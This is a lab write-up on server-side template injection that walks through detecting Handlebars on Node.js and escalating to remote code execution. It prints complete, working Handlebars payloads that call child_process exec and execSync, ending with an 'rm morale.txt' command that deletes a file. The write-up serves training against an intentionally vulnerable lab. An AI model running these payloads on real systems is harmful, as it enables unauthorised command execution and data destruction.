### Server side template injection (SSTI)
#### Intro
Server-side template injection is when an attacker is able to use native template syntax to inject a malicious payload into a template, which is then executed server-side.<br>
Template engines are designed to generate web pages by combining fixed templates with volatile data. Server-side template injection attacks can occur when user input is concatenated directly into a template, rather than passed in as data. 
#### Lab
<i>Please note that my Lab ID will change during the explanation</i><br>
To solve the lab, identify the template engine and find a documented exploit online that you can use to execute arbitrary code, then delete the morale.txt file from Carlos's home directory.

So let's try to find an injection point, viewing the details of the first item we can see that the message query string parameter is reflected into the page:
-- 72 --
We can eventually try to test for XSS, but as we can see it is not vulnerable (at least not to a simple attack)
-- 74 --
anyway knowing that this is not the aim of the lab, we can move forward to test for a simple SSTI payload:
```
{{7*7}}
```
Then we get an error response that indicates that the application could be vulnerable, here we get two interesting information: A module called <b>handlebars</b> is used and the coding language seems to be <b>Node.js</b>. 
-- 73 --
Since I have a very little knowledge about Node.js and nothing about Handlebars I have no idea how to proceed further 🤨. Googling for 'ssti handlebars node.js' returned some interesting results, among all I found this one: http://mahmoudsec.blogspot.com/2019/04/handlebars-template-injection-and-rce.html<br>
Telling the truth I had problem to clearly understand what <b>Mahmoud Gamal</b> actually did 😬, so I had to study quite a bit the handlebars library and Node.js.
So I ended up to code the following payload:
```
{{#with "s" as |string|}}
  {{#with "e"}}
    {{#with split as |conslist|}}
      {{this.pop}}
      {{this.push (lookup string.sub "constructor")}}
      {{this.pop}}
      {{#with string.split as |codelist|}}
        {{this.pop}}
        {{this.push "return require('child_process').exec('pwd');"}}
        {{this.pop}}
        {{#each conslist}}
          {{#with (string.sub.apply 0 codelist)}}
            {{this}}
          {{/with}}
        {{/each}}
      {{/with}}
    {{/with}}
  {{/with}}
{{/with}}
```
Here the real exploit is the instruction:<br><b>return require('child_process').exec('id');</b><br>
That is the way to execute shell command in Node.js: https://nodejs.org/api/child_process.html<br>
The problem with this payload is that we don't get the command ouptut into the web page, since the exec method is asynchronous and we need and handler to return the command output:
-- 75 --
I struggled quite a lot to find a way to print the output command into the response, finally I discovered that I can use the <b>execSync</b> method to execute the command synchronous, so I modified the payload as follows:
```
{{#with "s" as |string|}}
  {{#with "e"}}
    {{#with split as |conslist|}}
      {{this.pop}}
      {{this.push (lookup string.sub "constructor")}}
      {{this.pop}}
      {{#with string.split as |codelist|}}
        {{this.pop}}
        {{this.push "return require('child_process').execSync('ls -la').toString();"}}
        {{this.pop}}
        {{#each conslist}}
          {{#with (string.sub.apply 0 codelist)}}
            {{this}}
          {{/with}}
        {{/each}}
      {{/with}}
    {{/with}}
  {{/with}}
{{/with}}
```
This time we get the output printed into the response 😃
-- 76 --
To delete the morale.txt file just change the command string as follows:<br>
<b>return require('child_process').execSync('rm morale.txt').toString();<b><br>
we can double check that the file has been deleted resending the previous payload to list the files.


#### Reference
+ https://portswigger.net/web-security/server-side-template-injection
+ https://book.hacktricks.xyz/pentesting-web/ssti-server-side-template-injection
+ http://mahmoudsec.blogspot.com/2019/04/handlebars-template-injection-and-rce.html
